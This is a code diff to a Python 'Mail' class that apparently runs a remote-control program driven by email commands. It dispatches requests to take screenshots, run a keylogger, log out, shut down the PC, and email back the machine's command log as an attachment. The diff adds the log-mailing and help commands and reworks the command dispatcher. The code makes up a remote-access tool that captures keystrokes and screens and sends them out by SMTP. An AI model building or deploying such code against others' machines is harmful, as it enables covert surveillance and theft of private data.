@@ -1,6 +1,7 @@
 from constant import *
 from utilities import *
 
+
 class Mail:
     def __init__(self):
         self.sender: str = ""
@@ -34,7 +35,7 @@ class Mail:
             smtp.login(USERNAME, APP_PASS)
 
             smtp.sendmail(USERNAME, self.sender, self.email_message.as_string())
-            print("Mail sent to ", self.sender)
+            print("Mail sent to", self.sender)
 
     def take_screenshot(self):
         file_name: str = "Picture.png"
@@ -107,32 +108,40 @@ class Mail:
             self.email_message.attach(text_attachment)
 
     def log(self):
-        note2log(self.sender, self.cmd_list)
+        file_path = note2log(self.sender, self.cmd_list)
+        
+        self.set_info("Log File")
+        self.body = "The log file of your PC."
+        self.email_message.attach(MIMEText(self.body, "plain"))
+        
+        with open(file_path, "r") as text_file:
+            text_attachment = MIMEText(text_file.read())
+            text_attachment.add_header(
+                "Content-Disposition", "attachment; filename= mail.log"
+            )
+            self.email_message.attach(text_attachment)
+
+    def help(self):
+        content = list_command()
+        self.set_info("Help")
+        self.body = content
+        self.email_message.attach(MIMEText(self.body, "plain"))
 
     def process_command(self):
-        match self.cmd_list[0]:
-            case "screenshot":
-                self.take_screenshot()
-            case "webcam":
-                pass
-            case "keylog":
-                self.keylogger()
-            case "logout":
-                self.log_out()
-            case "shutdown":
-                self.shut_down()
-            case "list apps":
-                pass
-            case "list processes":
-                pass
-            case "kill process":
-                pass
-            case "show dir":
-                pass
-            case "show log":
-                pass
-            case _:
-                pass
+        command = {
+            "screenshot": self.take_screenshot,
+            # "webcam": None,
+            "keylog": self.keylogger,
+            "logout": self.log_out,
+            "shutdown": self.shut_down,
+            # "list apps": None,
+            # "list processes": None,
+            # "kill process": None,
+            # "show dir": None,
+            "show log": self.log,
+            "help": self.help,
+        }
+        command[self.cmd_list[0]]()
 
     def set_info(self, message: str):
         self.email_message = MIMEMultipart()
